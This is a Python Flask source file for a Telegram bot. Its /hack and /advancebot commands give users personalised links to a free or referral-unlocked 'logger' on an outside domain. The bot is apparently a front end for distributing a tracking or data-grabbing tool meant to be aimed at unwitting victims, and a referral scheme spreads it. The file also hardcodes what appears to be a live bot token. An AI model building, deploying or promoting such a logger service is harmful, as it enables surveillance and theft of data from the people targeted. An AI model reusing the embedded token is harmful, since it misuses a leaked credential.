import os
import json
import logging
import requests
import html
from flask import Flask, request, jsonify

# === CONFIG ===
TOKEN = "7580768387:AAFbDPp9dIm2zTYhOCXi8VHiV65Nu7P54Jg"
BOT_USERNAME = "TRACKER_R_N_bot"
API_URL = f"https://api.telegram.org/bot{TOKEN}"
DOMAIN = "https://noval-bot.onrender.com"
LOGGER_DOMAIN = "https://jattcom.infinityfreeapp.com"
USER_DB = "users.json"

# === INIT ===
app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

if not os.path.exists(USER_DB):
    with open(USER_DB, "w") as f:
        json.dump({}, f)

def load_users():
    with open(USER_DB) as f:
        return json.load(f)

def save_users(users):
    with open(USER_DB, "w") as f:
        json.dump(users, f, indent=2)

def send_message(chat_id, text):
    res = requests.post(f"{API_URL}/sendMessage", json={
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    })
    logging.info(f"[SEND] To {chat_id} | {res.status_code} | {res.text}")

# === WEBHOOK HANDLER ===
@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    update = request.get_json(force=True)
    logging.info(f"[WEBHOOK] Update: {json.dumps(update, indent=2)}")

    if "message" in update:
        message = update["message"]
        chat_id = message["chat"]["id"]
        full_text = message.get("text", "")
        text = full_text.strip().lower()
        user_id = str(chat_id)
        username = message["from"].get("username") or f"User_{user_id}"

        users = load_users()
        if user_id not in users:
            users[user_id] = {"username": username, "referrals": 0}

        # === /start ===
        if text.startswith("/start"):
            ref_id = None
            if " " in full_text:
                try:
                    ref_id = full_text.split()[1]
                    if ref_id != user_id and ref_id in users:
                        users[ref_id]["referrals"] += 1
                        send_message(int(ref_id), f"🎉 <b>New referral joined!</b>\nYou now have <b>{users[ref_id]['referrals']}/5</b> referrals.")
                except Exception as e:
                    logging.error(f"[ERROR] Referral logic failed: {e}")

            send_message(chat_id,
                f"✨ <b>Welcome, {username}!</b>\n\n"
                "📍 <b>Available Commands:</b>\n"
                "┏━━━━━━━━━━━━━\n"
                "┣ 🧲 <b>/hack</b> – Free Logger\n"
                "┣ 🔐 <b>/advancebot</b> – Premium Logger\n"
                "┣ 👥 <b>/refer</b> – Check Referrals\n"
                "┣ ℹ️ <b>/about</b> – About the Bot\n"
                "┗━━━━━━━━━━━━━\n\n"
                f"🔗 <b>Your Invite Link:</b>\n"
                f"https://t.me/{BOT_USERNAME}?start={user_id}"
            )

        # === /hack ===
        elif text == "/hack":
            send_message(chat_id,
                "🧲 <b>Your Free Logger is ready!</b>\n"
                f"👉 <a href='{LOGGER_DOMAIN}/f/?id={user_id}'>Click to Access Logger</a>\n\n"
                "⚠️ For educational use only!"
            )

        # === /advancebot ===
        elif text == "/advancebot":
            if users[user_id]["referrals"] >= 5:
                send_message(chat_id,
                    "🔓 <b>Premium Logger Unlocked!</b>\n"
                    f"👉 <a href='{LOGGER_DOMAIN}/p/?id={user_id}'>Access Premium Logger</a>\n\n"
                    "🚀 Power-packed tools inside!"
                )
            else:
                send_message(chat_id,
                    f"⛔ <b>Access Denied!</b>\nYou need 5 referrals to unlock Premium.\n"
                    f"You currently have: <b>{users[user_id]['referrals']}</b>"
                )

        # === /refer ===
        elif text == "/refer":
            send_message(chat_id,
                f"👥 <b>Your Referrals:</b> {users[user_id]['referrals']}\n\n"
                f"🔗 <b>Your Invite Link:</b>\n"
                f"https://t.me/{BOT_USERNAME}?start={user_id}"
            )

        # === /about ===
        elif text == "/about":
            send_message(chat_id,
                "<b>🤖 TRACKER_R_N_bot</b>\n"
                "👤 Created by: @rack_mr\n\n"
                "🧲 <b>Features:</b>\n"
                "• Free Logger → /hack\n"
                "• Premium Logger → /advancebot\n"
                "• Referral System → /refer\n"
                "• Invite System → /start"
            )

        save_users(users)

    return jsonify({"status": "ok"})

# === ROUTES ===
@app.route("/", methods=["GET"])
def home():
    return "✅ Bot is Running!"

@app.route("/setwebhook", methods=["GET"])
def setwebhook():
    url = f"{DOMAIN}/{TOKEN}"
    res = requests.get(f"{API_URL}/setWebhook", params={"url": url})
    logging.info(f"[SETWEBHOOK] Response: {res.text}")
    return res.text

# === LOCAL TEST RUN ===
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
